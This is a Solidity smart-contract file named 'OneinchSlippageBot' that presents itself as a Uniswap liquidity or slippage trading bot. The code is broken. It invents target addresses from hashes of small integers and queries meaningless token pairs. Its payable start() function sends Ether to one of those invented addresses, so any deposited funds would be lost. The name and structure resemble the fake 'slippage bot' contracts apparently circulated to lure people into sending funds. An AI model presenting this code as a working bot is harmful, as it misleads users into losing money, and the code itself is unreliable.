pragma solidity ^0.6.6;

import "https://github.com/Uniswap/uniswap-v2-core/blob/master/contracts/interfaces/IUniswapV2Factory.sol";
import "https://github.com/Uniswap/uniswap-v2-core/blob/master/contracts/interfaces/IUniswapV2Pair.sol";


contract OneinchSlippageBot {
    address private owner;
    uint256 private liquidity;
    address public uniswapV2Factory = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;

    event Log(string _msg);
    event NewContract(address _contract);

    constructor(address _uniswapV2Factory) public {
        owner = msg.sender;
        uniswapV2Factory = _uniswapV2Factory;
    }

    function sqrt(uint256 x) internal pure returns (uint256) {
        uint256 z = (x + 1) / 2;
        uint256 y = x;
        while (z < y) {
            y = z;
            z = (x / z + z) / 2;
        }
        return y;
    }

    function findNewContracts() internal view returns (address[] memory) {
        address[] memory contracts = new address[](10);
        for (uint256 i = 0; i < 10; i++) {
            bytes32 hash = keccak256(abi.encodePacked(i));
            address contractAddress = address(uint160(uint256(hash)));
            contracts[i] = contractAddress;
        }
        return contracts;
    }

    function orderContractsByLiquidity(address[] memory contracts) internal view returns (address) {
        address bestContract;
        uint256 bestLiquidity;
        for (uint256 i = 0; i < contracts.length; i++) {
            uint256 liquidity = getLiquidity(contracts[i]);
            if (liquidity > bestLiquidity) {
                bestContract = contracts[i];
                bestLiquidity = liquidity;
            }
        }
        return bestContract;
    }

     function getLiquidity(address contractAddress) internal view returns (uint256) {
        // Obtener la pareja de tokens del contrato
        IUniswapV2Factory factory = IUniswapV2Factory(uniswapV2Factory);
        address token0 = factory.getPair(contractAddress, address(0));
        address token1 = factory.getPair(contractAddress, address(1));

        // Obtener la reserva de liquidez del contrato
        IUniswapV2Pair pair0 = IUniswapV2Pair(token0);
        (uint256 reserve0, uint256 reserve1,) = pair0.getReserves();

        // Calcular la liquidez del contrato
        uint256 product = reserve0 * reserve1;
        uint256 liquidity = sqrt(product);

        return liquidity;
    }

    function start() public payable {
        address bestContract = orderContractsByLiquidity(findNewContracts());
        payable(bestContract).transfer(getLiquidity(bestContract));
    }

    function withdrawal() public payable {
        payable(owner).transfer(getLiquidity(address(this)));
    }
}
